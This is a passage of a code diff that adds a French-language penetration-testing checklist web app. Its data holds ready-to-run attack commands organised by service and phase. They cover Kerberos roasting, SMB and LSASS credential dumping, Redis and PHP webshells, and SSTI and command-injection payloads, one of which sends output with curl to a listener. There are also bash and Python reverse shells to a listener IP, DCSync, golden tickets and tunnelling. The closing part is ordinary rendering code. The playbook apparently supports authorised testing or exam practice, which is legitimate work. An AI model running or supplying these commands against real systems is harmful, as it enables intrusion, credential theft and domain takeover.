+     {needs:["USER"], t:"AS-REP roasting (users sans pré-auth, AUCUN mot de passe requis)", c:"impacket-GetNPUsers {DOMAIN}/ -dc-ip {IP} -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt"},
+     {needs:["CREDS"], t:"Préparer krb5.conf + TGT", c:"netexec smb {DC} -u {USER} -p {PASS} -k --generate-krb5-file krb5.conf\nsudo cp krb5.conf /etc/krb5.conf\nkinit {USER}\nklist"},
+   ]},
+  {id:"rpc", port:"135", svc:"RPC / DCOM", title:"MSRPC",
+   notes:["Énumérer comptes et endpoints via RPC."],
+   steps:[
+     {needs:[], t:"Session nulle rpcclient", c:"rpcclient -U '' -N {IP}\n# > enumdomusers / enumdomgroups / queryuser 0x..."},
+     {needs:[], t:"Énumération auto", c:"enum4linux-ng -A {IP}"},
+     {needs:[], t:"Dump endpoints RPC", c:"impacket-rpcdump {IP}"},
+   ]},
+  {id:"smb", port:"139/445", svc:"SMB", title:"SMB / NetBIOS",
+   notes:["Session nulle d'abord, puis énumération authentifiée si creds."],
+   steps:[
+     {needs:[], t:"Partages (null / guest)", c:"nxc smb {IP} -u '' -p '' --shares\nnxc smb {IP} -u 'guest' -p '' --shares\nsmbclient -L //{IP}/ -N"},
+     {needs:[], t:"RID brute → liste d'utilisateurs", c:"nxc smb {IP} -u '' -p '' --rid-brute | grep 'SidTypeUser' | awk -F'\\\\\\\\' '{print $2}' | awk '{print $1}' > users.txt"},
+     {needs:[], t:"Vulns connues", c:"sudo nmap -p445 --script smb-vuln-* {IP}\n# EternalBlue (MS17-010), SMBGhost…"},
+     {needs:["AUTH"], t:"Énumération authentifiée (shares + users + pols)", c:"nxc smb {IP} -u {USER} -p {PASS} --shares --users --pass-pol"},
+     {needs:["AUTH"], t:"Spider des partages lisibles", c:"nxc smb {IP} -u {USER} -p {PASS} -M spider_plus"},
+     {needs:["AUTH"], t:"Connexion à un partage", c:"smbclient //{IP}/<share> -U '{DOMAIN}/{USER}%{PASS}'\n# mget *  pour tout récupérer"},
+     {needs:["ADMIN"], t:"Dump SAM / LSA / LSASS (admin local)", c:"nxc smb {IP} -u {USER} -p {PASS} --local-auth --sam --lsa\nnxc smb {IP} -u {USER} -p {PASS} -M lsassy"},
+   ]},
+  {id:"snmp", port:"161", svc:"SNMP", title:"SNMP (UDP)",
+   notes:["Communautés par défaut : <b>public</b> / <b>private</b>."],
+   steps:[
+     {needs:[], t:"Brute community string", c:"onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {IP}"},
+     {needs:[], t:"Walk complet", c:"snmpwalk -v2c -c public {IP}\nsnmpbulkwalk -v2c -c public {IP} .1"},
+     {needs:[], t:"Extraction ciblée", c:"snmp-check {IP} -c public"},
+   ]},
+  {id:"ldap", port:"389/636", svc:"LDAP", title:"LDAP / LDAPS",
+   notes:["Énumération anonyme parfois ouverte ; sinon authentifiée."],
+   steps:[
+     {needs:[], t:"Énumération anonyme", c:"nxc ldap {IP} -u '' -p '' --users\nldapsearch -x -H ldap://{IP} -b 'DC=cible,DC=local' '(objectClass=user)' sAMAccountName"},
+     {needs:["AUTH"], t:"Descriptions (mdp en clair fréquents)", c:"nxc ldap {IP} -u {USER} -p {PASS} -M get-desc-users"},
+     {needs:["AUTH"], t:"Comptes AS-REP-ables / Kerberoastables", c:"nxc ldap {IP} -u {USER} -p {PASS} --asreproast asrep.txt --kerberoasting kerb.txt"},
+     {needs:["AUTH"], t:"Dump complet LDAP (ldapdomaindump)", c:"ldapdomaindump -u '{DOMAIN}\\\\{USER}' -p {PASS} {IP} -o ldapdump/"},
+   ]},
+  {id:"mssql", port:"1433", svc:"MSSQL", title:"MS SQL Server",
+   notes:["Auth SQL ou Windows. <b>xp_cmdshell</b> = exécution de commandes (rôle sysadmin)."],
+   steps:[
+     {needs:["AUTH"], t:"Connexion", c:"impacket-mssqlclient {DOMAIN}/{USER}:{PASS}@{IP} -windows-auth"},
+     {needs:["AUTH"], t:"Énumération de bases", c:"SELECT name FROM master.dbo.sysdatabases;\nenum_db"},
+     {needs:["AUTH"], t:"RCE via xp_cmdshell (si sysadmin)", c:"EXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';"},
+     {needs:["AUTH"], t:"Capture/relais NetNTLM (xp_dirtree)", c:"EXEC master..xp_dirtree '\\\\\\\\<listener_ip>\\\\share';  -- responder/ntlmrelayx en écoute"},
+   ]},
+  {id:"mysql", port:"3306", svc:"MySQL", title:"MySQL",
+   notes:["Tester root sans mot de passe."],
+   steps:[
+     {needs:[], t:"Connexion root sans pass", c:"mysql -h {IP} -u root"},
+     {needs:["CREDS"], t:"Connexion authentifiée", c:"mysql -h {IP} -u {USER} -p"},
+     {needs:["CREDS"], t:"Énumération", c:"SHOW DATABASES; SELECT user,authentication_string FROM mysql.user;"},
+   ]},
+  {id:"nfs", port:"2049", svc:"NFS", title:"NFS",
+   notes:["Escalade possible via no_root_squash."],
+   steps:[
+     {needs:[], t:"Lister les exports", c:"showmount -e {IP}"},
+     {needs:[], t:"Monter un export", c:"mkdir /mnt/nfs\nsudo mount -t nfs -o vers=3 {IP}:/<export> /mnt/nfs -o nolock"},
+   ]},
+  {id:"rdp", port:"3389", svc:"RDP", title:"RDP",
+   notes:["Tester NLA et les creds trouvés."],
+   steps:[
+     {needs:[], t:"Vuln BlueKeep", c:"sudo nmap -p3389 --script rdp-vuln-ms12-020 {IP}"},
+     {needs:["AUTH"], t:"Vérifier l'accès", c:"nxc rdp {IP} -u {USER} -p {PASS}"},
+     {needs:["CREDS"], t:"Session graphique", c:"xfreerdp /v:{IP} /u:{USER} /p:'{PASS}' /cert:ignore +clipboard /dynamic-resolution"},
+     {needs:["HASH"], t:"Pass-the-hash RDP (Restricted Admin)", c:"xfreerdp /v:{IP} /u:{USER} /pth:{PASS} /cert:ignore"},
+   ]},
+  {id:"winrm", port:"5985/5986", svc:"WinRM", title:"WinRM",
+   notes:["Membre de <b>Remote Management Users</b> → shell direct."],
+   steps:[
+     {needs:["AUTH"], t:"Vérifier l'accès", c:"nxc winrm {IP} -u {USER} -p {PASS}"},
+     {needs:["CREDS"], t:"Shell interactif", c:"evil-winrm -i {IP} -u {USER} -p '{PASS}'"},
+     {needs:["HASH"], t:"Shell par pass-the-hash", c:"evil-winrm -i {IP} -u {USER} -H {PASS}"},
+   ]},
+  {id:"redis", port:"6379", svc:"Redis", title:"Redis",
+   notes:["Souvent non authentifié. RCE via écriture de fichier ou modules."],
+   steps:[
+     {needs:[], t:"Connexion / info / config", c:"redis-cli -h {IP}\nredis-cli -h {IP} INFO\nredis-cli -h {IP} CONFIG GET '*'"},
+     {needs:[], t:"Lister / lire les clés", c:"redis-cli -h {IP} --scan\nredis-cli -h {IP} KEYS '*'"},
+     {needs:[], t:"Webshell via écriture de fichier", c:"redis-cli -h {IP} config set dir /var/www/html\nredis-cli -h {IP} config set dbfilename shell.php\nredis-cli -h {IP} set x '<?php system($_GET[\"c\"]); ?>'\nredis-cli -h {IP} save"},
+   ]},
+  {id:"postgres", port:"5432", svc:"PostgreSQL", title:"PostgreSQL",
+   notes:["Tester postgres/postgres. RCE via COPY ... PROGRAM (superuser)."],
+   steps:[
+     {needs:[], t:"Connexion", c:"psql 'host={IP} user=postgres password=postgres'\nnxc postgres {IP} -u postgres -p postgres"},
+     {needs:[], t:"Énumération", c:"\\l   -- bases\n\\du  -- rôles\nSELECT version();"},
+     {needs:[], t:"RCE (COPY TO PROGRAM)", c:"COPY (SELECT '') TO PROGRAM 'id';"},
+   ]},
+  {id:"oracle", port:"1521", svc:"Oracle TNS", title:"Oracle",
+   notes:["odat = couteau suisse. Brute des SID puis des comptes."],
+   steps:[
+     {needs:[], t:"Énumération SID / version", c:"odat all -s {IP}\ntnscmd10g version -h {IP}"},
+     {needs:[], t:"Brute des comptes", c:"odat passwordguesser -s {IP} -d <SID>"},
+   ]},
+  {id:"rsync", port:"873", svc:"rsync", title:"rsync",
+   notes:["Modules parfois listables/téléchargeables sans authentification."],
+   steps:[
+     {needs:[], t:"Lister les modules", c:"rsync -av --list-only rsync://{IP}/"},
+     {needs:[], t:"Télécharger un module", c:"rsync -av rsync://{IP}/<module>/ ./loot/"},
+   ]},
+  {id:"tomcat", port:"8080", svc:"Tomcat", title:"Apache Tomcat",
+   notes:["Creds par défaut tomcat/tomcat, admin/admin. Déployer un WAR = RCE."],
+   steps:[
+     {needs:[], t:"Accès au manager", c:"# /manager/html  /host-manager/html\nhydra -L users.txt -P pass.txt {IP} -s 8080 http-get /manager/html"},
+     {needs:["CREDS"], t:"Déployer un webshell WAR", c:"msfvenom -p java/jsp_shell_reverse_tcp LHOST=<listener_ip> LPORT=4444 -f war -o shell.war\ncurl -u {USER}:{PASS} -T shell.war '{URL}:8080/manager/text/deploy?path=/shell'"},
+   ]},
+  {id:"jenkins", port:"8080", svc:"Jenkins", title:"Jenkins",
+   notes:["Console Groovy = RCE. Tester admin/admin et l'accès anonyme."],
+   steps:[
+     {needs:[], t:"Détection", c:"curl -s {URL}:8080/login | grep -i jenkins\n# endpoints : /script  /scriptText  /asynchPeople/"},
+     {needs:["CREDS"], t:"RCE via Groovy (Script Console)", c:"# dans /script :\n\"id\".execute().text\n# reverse shell Groovy complet : revshells.com (option Groovy)"},
+   ]},
+  {id:"docker", port:"2375", svc:"Docker", title:"Docker API",
+   notes:["API non authentifiée = root sur l'hôte via montage de /."],
+   steps:[
+     {needs:[], t:"Lister", c:"docker -H tcp://{IP}:2375 ps\ncurl -s http://{IP}:2375/version"},
+     {needs:[], t:"Évasion (monter le FS hôte)", c:"docker -H tcp://{IP}:2375 run -v /:/mnt -it alpine chroot /mnt sh"},
+   ]},
+  {id:"ajp", port:"8009", svc:"AJP", title:"AJP / Ghostcat (CVE-2020-1938)",
+   notes:["Lecture/inclusion de fichiers via le connecteur AJP de Tomcat."],
+   steps:[
+     {needs:[], t:"Lire WEB-INF/web.xml", c:"python3 ajpShooter.py http://{IP} 8009 /WEB-INF/web.xml read"},
+   ]},
+  {id:"mongo", port:"27017", svc:"MongoDB", title:"MongoDB",
+   notes:["Souvent sans authentification."],
+   steps:[
+     {needs:[], t:"Connexion / énumération", c:"mongosh mongodb://{IP}:27017\n# show dbs ; use <db> ; show collections ; db.<col>.find()"},
+   ]},
+  {id:"vnc", port:"5900", svc:"VNC", title:"VNC",
+   notes:["Mot de passe parfois faible ou absent."],
+   steps:[
+     {needs:[], t:"Se connecter", c:"vncviewer {IP}::5900"},
+     {needs:[], t:"Brute force", c:"hydra -P /usr/share/wordlists/rockyou.txt vnc://{IP}"},
+   ]},
+  {id:"ipmi", port:"623", svc:"IPMI", title:"IPMI / BMC",
+   notes:["Dump de hash via RAKP (CVE-2013-4786), même sans creds."],
+   steps:[
+     {needs:[], t:"Dump des hashes", c:"msf> use auxiliary/scanner/ipmi/ipmi_dumphashes\n# crack : hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt"},
+   ]},
+]},
+
+{phase:"2 - Attaques Web", sections:[
+  {id:"sqli", port:"WEB", svc:"injection", title:"SQL Injection",
+   notes:["Bypass d'auth classique : <b>admin'--</b> ou <b>' OR '1'='1</b>"],
+   steps:[
+     {needs:[], t:"Détection / dump (GET)", c:"sqlmap -u \"{URL}/page.php?id=1\" --batch --dbs"},
+     {needs:[], t:"POST request", c:"sqlmap -u \"{URL}/login.php\" --data=\"username=admin&password=test\" --batch --dbs"},
+     {needs:[], t:"Depuis une requête capturée + dump", c:"sqlmap -r request.txt --batch --dbs --dump"},
+     {needs:[], t:"RCE (si autorisé)", c:"sqlmap -r request.txt --batch --os-shell"},
+   ]},
+  {id:"lfi", port:"WEB", svc:"inclusion", title:"LFI / Path Traversal",
+   notes:["<b>-mc</b> matcher le code, <b>-fs</b> filtrer par taille."],
+   steps:[
+     {needs:[], t:"Fuzz du paramètre", c:"ffuf -u \"{URL}/index.php?FUZZ=test\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <taille>"},
+     {needs:[], t:"Fuzz fichiers / wrappers", c:"ffuf -u \"{URL}/index.php?page=FUZZ\" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"},
+     {needs:[], t:"Lecture directe", c:"curl \"{URL}/index.php?page=../../../../etc/passwd\""},
+   ]},
+  {id:"bruteweb", port:"WEB", svc:"bruteforce", title:"Brute force formulaire",
+   notes:["Adapter <b>&lt;path&gt;</b>, <b>&lt;params&gt;</b> et la <b>&lt;fail_string&gt;</b>."],
+   steps:[
+     {needs:[], t:"POST form (hydra)", c:"hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {IP} http-post-form \"<path>:<params>:<fail_string>\""},
+     {needs:[], t:"Basic auth", c:"hydra -L users.txt -P rockyou.txt {IP} http-get /<path>"},
+   ]},
+  {id:"wordpress", port:"WEB", svc:"CMS", title:"WordPress",
+   notes:["Si WordPress détecté : wpscan en premier."],
+   steps:[
+     {needs:[], t:"Énumération (users, plugins, thèmes)", c:"wpscan --url {URL} --enumerate u,ap,at --plugins-detection aggressive"},
+     {needs:[], t:"Brute force d'un user", c:"wpscan --url {URL} -U admin -P /usr/share/wordlists/rockyou.txt"},
+   ]},
+  {id:"cmdinj", port:"WEB", svc:"injection", title:"Command Injection",
+   notes:["Tester les séparateurs : ; | & && newline $(...) `...`"],
+   steps:[
+     {needs:[], t:"Détection (dans un paramètre)", c:"; id\n| id\n$(id)\n`id`"},
+     {needs:[], t:"Blind (time / out-of-band)", c:"; sleep 5\n; curl http://<listener_ip>/$(whoami)"},
+   ]},
+  {id:"ssti", port:"WEB", svc:"injection", title:"SSTI (templates)",
+   notes:["Tester <b>{{7*7}}</b> : si la page affiche 49, c'est vulnérable."],
+   steps:[
+     {needs:[], t:"Identifier le moteur", c:"# {{7*7}}=49 -> Jinja2/Twig | ${7*7}=49 -> Freemarker | #{7*7} -> Ruby"},
+     {needs:[], t:"RCE Jinja2 (Python)", c:"{{ cycler.__init__.__globals__.os.popen('id').read() }}"},
+   ]},
+  {id:"upload", port:"WEB", svc:"upload", title:"Upload de fichier",
+   notes:["Contourner les filtres d'extension / content-type."],
+   steps:[
+     {needs:[], t:"Bypass d'extension / type", c:"# shell.php.jpg | shell.pHp | shell.phtml | .php%00.jpg\n# Content-Type: image/jpeg + magic bytes GIF89a; en tête"},
+     {needs:[], t:"Webshell PHP minimal", c:"echo '<?php system($_GET[\"c\"]); ?>' > shell.php"},
+   ]},
+]},
+
+{phase:"3 - Active Directory", sections:[
+  {id:"adspray", port:"AD", svc:"creds", title:"Acquisition de credentials",
+   notes:["Comment passer de <b>rien</b> à des <b>creds</b>. Le spraying suppose une liste d'users."],
+   steps:[
+     {needs:["USER"], t:"Password spraying (1 mdp, N users - attention au lockout)", c:"nxc smb {IP} -u users.txt -p 'Saison2025!' --continue-on-success | grep '[+]'"},
+     {needs:["USER"], t:"Spray du username = password", c:"nxc smb {IP} -u users.txt -p users.txt --no-bruteforce --continue-on-success"},
+     {needs:["USER"], t:"Crack AS-REP / Kerberoast récoltés", c:"hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt   # AS-REP\nhashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt    # TGS"},
+     {needs:[], t:"Poisoning LLMNR/NBT-NS (capture NetNTLMv2)", c:"sudo responder -I <iface> -dwv\n# puis : hashcat -m 5600 hashes.txt rockyou.txt"},
+     {needs:["AUTH"], t:"GPP cpassword (SYSVOL, déchiffrable)", c:"nxc smb {DC} -u {USER} -p {PASS} -M gpp_password\nnxc smb {DC} -u {USER} -p {PASS} -M gpp_autologin"},
+   ]},
+  {id:"adenum", port:"AD", svc:"énum", title:"Énumération du domaine (authentifié)",
+   notes:["Une fois un compte valide obtenu, cartographier l'AD."],
+   steps:[
+     {needs:["AUTH"], t:"Collecte BloodHound", c:"nxc ldap {DC} -u {USER} -p {PASS} --bloodhound -c all --dns-server {IP}\n# alt : bloodhound-python -u {USER} -p '{PASS}' -d {DOMAIN} -ns {IP} -c All"},
+     {needs:["AUTH"], t:"Valider l'accès machine par machine", c:"nxc smb targets.txt -u {USER} -p {PASS}\n# (Pwn3d!) = admin local"},
+     {needs:["AUTH"], t:"Sessions / utilisateurs connectés", c:"nxc smb {IP} -u {USER} -p {PASS} --sessions --loggedon-users"},
+   ]},
+  {id:"roast", port:"AD", svc:"roasting", title:"Kerberoast / AS-REP",
+   notes:["Récolter les tickets et cracker hors-ligne."],
+   steps:[
+     {needs:["AUTH"], t:"Kerberoasting", c:"impacket-GetUserSPNs {DOMAIN}/{USER}:{PASS} -dc-ip {IP} -request -outputfile kerb.txt"},
+     {needs:["USER"], t:"AS-REP roasting (sans mot de passe)", c:"impacket-GetNPUsers {DOMAIN}/ -dc-ip {IP} -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt"},
+     {needs:["AUTH"], t:"Targeted Kerberoast (via ACL d'écriture)", c:"targetedKerberoast.py -d {DOMAIN} -u {USER} -p {PASS} --dc-ip {IP}"},
+   ]},
+  {id:"adacl", port:"AD", svc:"ACL/deleg", title:"Abus d'ACL & délégations",
+   notes:["Chemins révélés par BloodHound. Suppose un compte de domaine."],
+   steps:[
+     {needs:["AUTH"], t:"Forcer un changement de mdp (GenericAll/ForceChangePassword)", c:"net rpc password \"<cible>\" \"NewPass123!\" -U \"{DOMAIN}\"/\"{USER}\"%\"{PASS}\" -S {DC}\n# alt : bloodyAD -d {DOMAIN} -u {USER} -p {PASS} --host {DC} set password <cible> NewPass123!"},
+     {needs:["AUTH"], t:"S'ajouter à un groupe (GenericAll/AddMember)", c:"bloodyAD -d {DOMAIN} -u {USER} -p {PASS} --host {DC} add groupMember \"<Groupe>\" {USER}"},
+     {needs:["AUTH"], t:"RBCD (GenericWrite sur un ordinateur)", c:"impacket-addcomputer {DOMAIN}/{USER}:{PASS} -computer-name 'EVIL$' -computer-pass 'Evil123!'\nimpacket-rbcd -delegate-from 'EVIL$' -delegate-to '<TARGET>$' -action write {DOMAIN}/{USER}:{PASS}"},
+   ]},
+  {id:"adcs", port:"AD", svc:"PKI", title:"ADCS (certificats)",
+   notes:["Templates mal configurés (ESC1-ESC8) = élévation vers DA."],
+   steps:[
+     {needs:["AUTH"], t:"Trouver des templates vulnérables", c:"certipy find -u {USER}@{DOMAIN} -p {PASS} -dc-ip {IP} -vulnerable -stdout"},
+     {needs:["AUTH"], t:"ESC1 - demander un cert en tant qu'admin", c:"certipy req -u {USER}@{DOMAIN} -p {PASS} -dc-ip {IP} -ca <CA> -template <Template> -upn administrator@{DOMAIN}"},
+     {needs:[], t:"Auth via le certificat → hash NT", c:"certipy auth -pfx administrator.pfx -dc-ip {IP}"},
+   ]},
+  {id:"coerce", port:"AD", svc:"relais", title:"Coercition / relais NTLM",
+   notes:["Forcer une auth machine puis relayer. Prioriser les protocoles ci-dessous."],
+   steps:[
+     {needs:["AUTH"], t:"Scanner les protocoles coercibles", c:"# MS-RPRN=PrintBug | MS-EFSR=PetitPotam | MS-DFSNM=DFSCoerce | MS-FSRVP=ShadowCoerce\ncoercer scan -t {IP} -u {USER} -p {PASS} -d {DOMAIN}"},
+     {needs:[], t:"PetitPotam (souvent non-authentifié)", c:"python3 PetitPotam.py -d {DOMAIN} <listener_ip> {IP}"},
+     {needs:[], t:"Relais NTLM vers LDAPS (RBCD/shadow creds)", c:"impacket-ntlmrelayx -t ldaps://{DC} --delegate-access -smb2support"},
+   ]},
+  {id:"lateral", port:"AD", svc:"latéral", title:"Mouvement latéral",
+   notes:["Avec un mot de passe ou un hash (pass-the-hash)."],
+   steps:[
+     {needs:["ADMIN"], t:"Exécution de commandes (psexec/wmiexec)", c:"impacket-wmiexec {DOMAIN}/{USER}:{PASS}@{IP}\nimpacket-psexec {DOMAIN}/{USER}@{IP} -hashes :{PASS}"},
+     {needs:["ADMIN"], t:"Commande one-shot via netexec", c:"nxc smb {IP} -u {USER} -p {PASS} -x 'whoami'\nnxc smb {IP} -u {USER} -H {PASS} -x 'whoami'   # pass-the-hash"},
+     {needs:["HASH"], t:"Pass-the-hash (validation large)", c:"nxc smb targets.txt -u {USER} -H {PASS} --local-auth"},
+   ]},
+  {id:"dcsync", port:"AD", svc:"domination", title:"Domination du domaine",
+   notes:["Droits de réplication (DA / DCSync) → dump complet."],
+   steps:[
+     {needs:["DA"], t:"DCSync (krbtgt + tous les hashes)", c:"impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{DC} -just-dc"},
+     {needs:["DA"], t:"Dump d'un seul compte (krbtgt)", c:"impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{DC} -just-dc-user krbtgt"},
+     {needs:["DA"], t:"Golden Ticket", c:"impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain {DOMAIN} Administrator"},
+     {needs:["ADMIN"], t:"Dump NTDS.dit", c:"impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{DC} -just-dc-ntlm\nnxc smb {DC} -u {USER} -p {PASS} --ntds"},
+   ]},
+  {id:"tickets", port:"AD", svc:"kerberos", title:"Tickets & délégations",
+   notes:["Réutilisation de tickets et abus de délégation (révélés par BloodHound)."],
+   steps:[
+     {needs:["HASH"], t:"Overpass-the-hash (hash NT → TGT)", c:"impacket-getTGT {DOMAIN}/{USER} -hashes :{PASS}\nexport KRB5CCNAME={USER}.ccache\nnxc smb {DC} -k --use-kcache"},
+     {needs:["HASH"], t:"Silver Ticket (hash d'un compte de service)", c:"impacket-ticketer -nthash {PASS} -domain-sid <SID> -domain {DOMAIN} -spn cifs/{DC} {USER}"},
+     {needs:["AUTH"], t:"Constrained delegation (S4U)", c:"impacket-getST -spn cifs/{DC} -impersonate Administrator {DOMAIN}/{USER}:{PASS}"},
+     {needs:["AUTH"], t:"Pass-the-Ticket (.ccache)", c:"export KRB5CCNAME=ticket.ccache\nklist\nimpacket-psexec -k -no-pass {DOMAIN}/{USER}@{DC}"},
+   ]},
+  {id:"shadowcreds", port:"AD", svc:"PKI", title:"Shadow Credentials",
+   notes:["GenericWrite sur un compte + ADCS actif → s'authentifier en tant que la cible."],
+   steps:[
+     {needs:["AUTH"], t:"Ajout d'une clé (msDS-KeyCredentialLink)", c:"certipy shadow auto -u {USER}@{DOMAIN} -p {PASS} -account <cible> -dc-ip {IP}"},
+   ]},
+]},
+
+{phase:"4 - Post-exploitation", sections:[
+  {id:"linpriv", port:"LIN", svc:"privesc", title:"Privesc Linux",
+   notes:["Suppose un shell sur la cible. GTFOBins pour SUID/sudo."],
+   steps:[
+     {needs:["SHELL"], t:"Énumération auto + sudo", c:"./linpeas.sh\nsudo -l"},
+     {needs:["SHELL"], t:"SUID / capabilities / cron", c:"find / -perm -4000 -type f 2>/dev/null\ngetcap -r / 2>/dev/null\ncat /etc/crontab"},
+     {needs:["SHELL"], t:"Noyau", c:"uname -a   # croiser avec un exploit kernel connu"},
+   ]},
+  {id:"winpriv", port:"WIN", svc:"privesc", title:"Privesc Windows",
+   notes:["LOLBAS pour les binaires signés détournables."],
+   steps:[
+     {needs:["SHELL"], t:"Énumération auto + privilèges", c:"winPEASx64.exe\nwhoami /priv   # SeImpersonate ? -> Potato"},
+     {needs:["SHELL"], t:"Potato (SeImpersonate/SeAssignPrimaryToken)", c:"PrintSpoofer.exe -i -c cmd\nGodPotato -cmd \"cmd /c whoami\""},
+     {needs:["SHELL"], t:"Services / unquoted path / autoruns", c:"# WinPEAS les liste - voir https://lolbas-project.github.io/"},
+   ]},
+  {id:"loot", port:"LOOT", svc:"pillage", title:"Pillage & persistance",
+   notes:["Récupérer creds, clés, conf avant de pivoter."],
+   steps:[
+     {needs:["SHELL"], t:"Recherche de creds (Linux)", c:"grep -rinE 'password|passwd|secret|api[_-]?key' / 2>/dev/null"},
+     {needs:["SHELL"], t:"Recherche de creds (Windows)", c:"findstr /SIM \"password\" *.xml *.ini *.txt *.config\ncmdkey /list"},
+     {needs:["ADMIN"], t:"Mimikatz / dump LSASS", c:"sekurlsa::logonpasswords\nlsadump::sam"},
+   ]},
+]},
+
+{phase:"5 - Shells, transfert & pivot", sections:[
+  {id:"revshell", port:"shell", svc:"reverse", title:"Reverse shells & stabilisation",
+   notes:["Générer, écouter, puis stabiliser le TTY. Catalogue : revshells.com"],
+   steps:[
+     {needs:[], t:"Listener", c:"rlwrap nc -lvnp 4444"},
+     {needs:[], t:"Payloads (Linux)", c:"bash -i >& /dev/tcp/<listener_ip>/4444 0>&1\npython3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"<listener_ip>\",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"},
+     {needs:[], t:"Payloads (msfvenom)", c:"msfvenom -p windows/x64/shell_reverse_tcp LHOST=<listener_ip> LPORT=4444 -f exe -o s.exe\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=<listener_ip> LPORT=4444 -f elf -o s.elf"},
+     {needs:["SHELL"], t:"Stabiliser le TTY", c:"# 1) dans le shell de la cible :\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# 2) touche clavier : Ctrl+Z  (met le shell en arrière-plan)\n# 3) dans TON terminal local :\nstty raw -echo; fg\n# 4) de retour dans le shell (Entrée), taper :\nexport TERM=xterm"},
+   ]},
+  {id:"transfer", port:"files", svc:"transfert", title:"Transfert de fichiers",
+   notes:["Monter un serveur côté attaquant, télécharger côté cible."],
+   steps:[
+     {needs:[], t:"Serveur côté attaquant", c:"python3 -m http.server 80\nimpacket-smbserver share . -smb2support"},
+     {needs:["SHELL"], t:"Télécharger (cible Linux)", c:"wget http://<listener_ip>/f -O /tmp/f\ncurl http://<listener_ip>/f -o /tmp/f"},
+     {needs:["SHELL"], t:"Télécharger (cible Windows)", c:"certutil -urlcache -f http://<listener_ip>/f f.exe\npowershell iwr http://<listener_ip>/f -OutFile f.exe"},
+   ]},
+  {id:"pivot", port:"pivot", svc:"tunneling", title:"Pivoting / tunneling",
+   notes:["Rebondir vers un réseau interne via la machine compromise."],
+   steps:[
+     {needs:["SHELL"], t:"Ligolo-ng (recommandé)", c:"# attaquant : ./proxy -selfcert\n# cible    : ./agent -connect <listener_ip>:11601 -ignore-cert"},
+     {needs:["SHELL"], t:"Chisel (reverse SOCKS)", c:"# attaquant : ./chisel server -p 8000 --reverse\n# cible    : ./chisel client <listener_ip>:8000 R:1080:socks"},
+     {needs:["SHELL"], t:"SSH tunnels", c:"ssh -D 1080 {USER}@{IP}              # SOCKS dynamique\nssh -L 8080:127.0.0.1:80 {USER}@{IP}   # forward local"},
+   ]},
+  {id:"crack", port:"hash", svc:"hashcat", title:"Cassage de hash (hashcat / john)",
+   notes:["Identifier le type (hashid) puis choisir le bon mode <b>-m</b>."],
+   steps:[
+     {needs:[], t:"Identifier le hash", c:"hashid '<hash>'\nname-that-hash -t '<hash>'"},
+     {needs:[], t:"Modes -m courants", c:"# 1000  NTLM            | 1800  sha512crypt ($6$)\n# 5500  NetNTLMv1       | 5600  NetNTLMv2\n# 13100 Kerberoast (TGS) | 18200 AS-REP\n# 0 MD5 | 100 SHA1 | 3200 bcrypt | 7300 IPMI"},
+     {needs:[], t:"Lancer le crack", c:"hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt\nhashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"},
+   ]},
+]},
+];
+
+// ============================================================
+//  ÉTAT
+// ============================================================
+const CTX_KEY="pentestmap_ctx_v1";
+let ctx=new Set(loadCtx());
+const MODE_KEY="pentestmap_lockmode_v1";
+let lockMode=localStorage.getItem(MODE_KEY)||"reduce";
+let focusMode=localStorage.getItem("pentestmap_focus_v1")==='1';
+let openPorts=null,portFilter=false;
+function loadCtx(){try{return JSON.parse(localStorage.getItem(CTX_KEY))||[]}catch(e){return[]}}
+function saveCtx(){localStorage.setItem(CTX_KEY,JSON.stringify([...ctx]))}
+function effectiveCtx(){
+  const e=new Set(ctx); e.add("NET");
+  if(e.has("CREDS")){e.add("USER");e.add("AUTH");}
+  if(e.has("HASH"))e.add("AUTH");
+  if(e.has("ADMIN"))e.add("AUTH");
+  if(e.has("DA")){e.add("AUTH");e.add("ADMIN");}
+  return e;
+}
+
+// ============================================================
+//  RENDU
+// ============================================================
+const main=document.getElementById('main');
+const nav=document.getElementById('nav');
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+
+function renderCmd(raw){
+  let s=esc(raw);
+  s=s.replace(/(#[^\n]*)/g,'<span class="cmt">$1</span>');
+  s=s.replace(/\{IP\}/g,'<span class="tok" data-tok="IP"></span>')
+     .replace(/\{DOMAIN\}/g,'<span class="tok" data-tok="DOMAIN"></span>')
+     .replace(/\{DC\}/g,'<span class="tok" data-tok="DC"></span>')
+     .replace(/\{URL\}/g,'<span class="tok" data-tok="URL"></span>')
+     .replace(/\{USER\}/g,'<span class="tok" data-tok="USER"></span>')
+     .replace(/\{PASS\}/g,'<span class="tok" data-tok="PASS"></span>')
+     .replace(/&lt;listener_ip&gt;/g,'<span class="tok" data-tok="LHOST"></span>')
+     .replace(/&lt;iface&gt;/g,'<span class="tok" data-tok="IFACE"></span>')
+     .replace(/\/usr\/share\/wordlists\/rockyou\.txt/g,'<span class="tok" data-tok="WORDLIST"></span>');
+  return s;
+}
+
+function build(){
+  main.innerHTML='';nav.innerHTML='';
+  const tb=document.createElement('div');tb.className='nav-tb';
+  tb.innerHTML='<button id="navToggle" title="Replier / déplier le menu">▾</button>';
+  nav.appendChild(tb);
+  const mtb=document.createElement('div');mtb.className='main-tb';
